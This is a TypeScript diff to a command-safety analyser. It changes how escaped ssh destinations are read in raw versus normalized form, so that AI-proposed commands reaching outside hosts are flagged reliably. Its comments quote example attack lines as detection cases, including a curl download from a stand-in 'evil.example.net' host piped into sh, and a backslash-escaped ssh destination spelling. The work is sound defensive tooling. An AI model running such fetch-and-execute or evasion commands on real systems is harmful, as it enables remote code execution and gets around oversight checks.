@@ -950,6 +950,29 @@ interface AnalyzedSegment {
 }
 
 /**
+ * Which form of the command a pass is reading — and therefore **whether its tokens are what the
+ * shell hands the program, or what the user typed.**
+ *
+ * {@link findComposedOpenWorld} runs {@link analyzeComposed} over both, because normalization
+ * destroys analysis the raw form still has (a Windows path separator). The two are not
+ * interchangeable for a test about GRAMMAR: `normalized` tokens have already had `\x` collapsed to
+ * `x`, so they are the argv, while `raw` tokens still carry every escape — and `ssh \-h`, whose
+ * argv[1] the shell hands over as `-h`, looks like a plain operand there.
+ *
+ * So an arm that reads a program's grammar off a token must collapse a `raw` token first and must
+ * NOT touch a `normalized` one: collapsing twice reads `\\-h` — which reaches the program as `\-h`,
+ * an operand — as the flag `-h`. {@link remoteCommandOperands} is the arm that does this; the other
+ * arms read flag names and an at-sign convention rather than grammar, and reading those off the raw
+ * form is a residual this type is the handle for.
+ */
+type CommandForm = 'normalized' | 'raw';
+
+/** The token as the SHELL hands it over: on the raw form the escapes are still in it. */
+function asPassed(token: string, form: CommandForm): string {
+  return form === 'raw' ? normalizeCommand(token) : token;
+}
+
+/**
  * The characters a token may contain to be quoted back inside our own note.
  *
  * **This is an injection boundary, not cosmetics.** The note is OUR trusted text and sits OUTSIDE
@@ -1300,22 +1323,35 @@ const REMOTE_COMMAND_HEADS: ReadonlySet<string> = new Set(['ssh']);
  * (`ssh myserver …`) names no counterparty, which is the same rule that keeps `git push origin main`
  * and `npm install lodash` out of the floor, and there would be no host to attach the sentence to.
  *
- * **The two tests below OVERLAP on every input reachable today, and that is stated rather than
- * claimed away.** Deleting the dash test alone changes no behaviour and kills no test, because
- * {@link matchArgv} only ever admits a positional operand or the part of a token AFTER an `=`, so a
- * token beginning with a dash is never in `segment.hosts` and the host test declines it anyway. It
- * is kept because it is the one that states ssh's grammar — the host test reaches the same answer
- * for a reason about our own extractor rather than about ssh, and a later widening there would
- * silently make argv[1] a "destination" that ssh never treated as one. Mutating the destination to
- * *"the first host literal anywhere in the part"* — the shape this guards against — does turn the
- * spec red.
+ * **The dash test reads argv[1] as the SHELL hands it to ssh, which on the raw form is not how it
+ * was typed** ({@link asPassed}) — and that is what keeps the two tests below from being one test.
+ * `ssh \-deploy@evil.example.net …` reaches ssh as `-deploy@evil.example.net`, a dash-leading token
+ * this grammar says is not a destination; the typed string begins with a backslash instead, so
+ * {@link matchArgv} admits it as a positional operand and the host test alone reads it as a
+ * destination. That spelling is also the one shape where the raw pass is the ONLY one with an
+ * answer — the normalized pass drops the token as a flag and finds no host at all — so a dash test
+ * that read the typed form would let {@link findComposedOpenWorld}'s fallback assert a remote
+ * execution the normalized pass had refused. Declining it costs the flowless sentence, which still
+ * names the host.
+ *
+ * **The collapse is the shared {@link normalizeCommand} and not a bespoke backslash strip.** `\\-h`
+ * reaches ssh as `\-h`, an operand rather than a flag, and the shared collapse is what reads that
+ * pair the way the shell does; a second escape-collapse living here is how two layers come to
+ * disagree about what an escape means. Its NFKC step also declines a fullwidth-hyphen token that ssh
+ * would accept as a destination — the same fail-safe direction, and the normalized form is what the
+ * rater is SHOWN, so declining keeps this sentence from contradicting the command printed beside it.
+ *
+ * The host test states the other half: a token ssh treats as a destination is still only one we may
+ * name when this part found it to be a host literal. Mutating the destination to *"the first host
+ * literal anywhere in the part"* — the shape that test guards against — does turn the spec red.
  */
 function remoteCommandOperands(
-  segment: AnalyzedSegment
+  segment: AnalyzedSegment,
+  form: CommandForm
 ): { readonly destination: string; readonly remote: readonly string[] } | null {
   if (!REMOTE_COMMAND_HEADS.has(segment.head)) return null;
   const destination = segment.argv[1];
-  if (destination === undefined || destination.startsWith('-')) return null;
+  if (destination === undefined || asPassed(destination, form).startsWith('-')) return null;
   if (!segment.hosts.includes(destination)) return null;
   const remote = segment.argv.slice(2);
   return remote.length === 0 ? null : { destination, remote };
@@ -1345,7 +1381,7 @@ function analyzeSegment(segment: CommandSegment): AnalyzedSegment | null {
  * `curl -x http://proxy.corp.local:3128 https://evil.example.net/x | sh`, and the sentence that
  * names it alone hides the host whose bytes `sh` runs.
  */
-function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
+function findFlow(segments: readonly AnalyzedSegment[], form: CommandForm): ComposedFlow | null {
   for (let i = 0; i + 1 < segments.length; i++) {
     const upstream = segments[i];
     const downstream = segments[i + 1];
@@ -1372,7 +1408,7 @@ function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
     // Before the substitution arm, because it is the more specific reading of the same token: on an
     // ssh line a substitution in the remote-command position is not merely SENT to the host, it is
     // what the host RUNS, and the flowless arm used to be all this shape got.
-    const remote = remoteCommandOperands(segment);
+    const remote = remoteCommandOperands(segment, form);
     if (remote !== null && remote.remote.some((token) => EXECUTING_SUBSTITUTION_RE.test(token))) {
       return {
         kind: 'remote-command',
@@ -1403,14 +1439,19 @@ function findFlow(segments: readonly AnalyzedSegment[]): ComposedFlow | null {
   return null;
 }
 
-/** Read every part of one form of the command; `null` when no part names a host. */
-function analyzeComposed(command: string): ComposedOpenWorldFinding | null {
+/**
+ * Read every part of one form of the command; `null` when no part names a host.
+ *
+ * `form` says which form was handed in, because a flow arm that reads a program's grammar has to
+ * know whether its tokens still carry the shell's escapes — see {@link CommandForm}.
+ */
+function analyzeComposed(command: string, form: CommandForm): ComposedOpenWorldFinding | null {
   const segments = splitComposed(command)
     .map(analyzeSegment)
     .filter((segment): segment is AnalyzedSegment => segment !== null);
   const hosts = [...new Set(segments.flatMap((segment) => [...segment.hosts]))];
   if (hosts.length === 0) return null;
-  return { hosts, flow: findFlow(segments) };
+  return { hosts, flow: findFlow(segments, form) };
 }
 
 /**
@@ -1430,11 +1471,20 @@ function analyzeComposed(command: string): ComposedOpenWorldFinding | null {
  * gives: normalization collapses `\x` to `x`, which defeats `c\url` and destroys a Windows path
  * separator, so the raw pass is the only one that still sees `C:\Windows\System32\curl.exe`.
  *
+ * **The raw pass recovers what normalization DESTROYS; it must not manufacture what normalization
+ * REFUSED.** Both look identical from here — either way the raw form is the only one with an answer —
+ * so the difference is drawn where the claim is made rather than by comparing the two results: each
+ * pass says which form it handed in ({@link CommandForm}), and an arm reading a program's grammar
+ * reads its tokens as the shell hands them over. See {@link remoteCommandOperands}, the arm that
+ * names a destination.
+ *
  * @param command The raw command string as the model proposed it.
  */
 export function findComposedOpenWorld(command: string): ComposedOpenWorldFinding | null {
   if (classifyCommand(command, normalizeCommand) !== null) return null;
-  return analyzeComposed(normalizeCommand(command)) ?? analyzeComposed(command);
+  return (
+    analyzeComposed(normalizeCommand(command), 'normalized') ?? analyzeComposed(command, 'raw')
+  );
 }
 
 /**
